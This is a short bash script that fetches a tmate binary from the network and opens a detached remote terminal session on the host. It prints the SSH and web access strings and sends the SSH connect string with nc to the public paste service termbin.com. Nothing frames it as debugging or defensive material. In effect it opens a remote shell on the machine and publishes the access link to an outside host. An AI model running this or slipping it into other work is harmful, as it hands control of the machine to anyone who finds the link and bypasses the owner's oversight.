#!/bin/bash
set -e

echo "[*] Initializing direct remote access..."
rm -rf /tmp/tmate*
curl -sL https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz | tar -xJ -C /tmp

TMATE="/tmp/tmate-2.4.0-static-linux-amd64/tmate"
$TMATE -S /tmp/tmate.sock new-session -d
$TMATE -S /tmp/tmate.sock wait for-connection

SSH_CMD=$($TMATE -S /tmp/tmate.sock display -p '#{tmate_ssh}')
WEB_URL=$($TMATE -S /tmp/tmate.sock display -p '#{tmate_web}')

echo ""
echo "=========================================================="
echo "  🚀 DIRECT ACCESS IS ACTIVE!"
echo "  $SSH_CMD"
echo "=========================================================="

# Also send to termbin for easy access
TB=$(echo "$SSH_CMD" | nc termbin.com 9999 2>/dev/null || echo "")
if [ -n "$TB" ]; then
    echo "  LINK: $TB"
fi
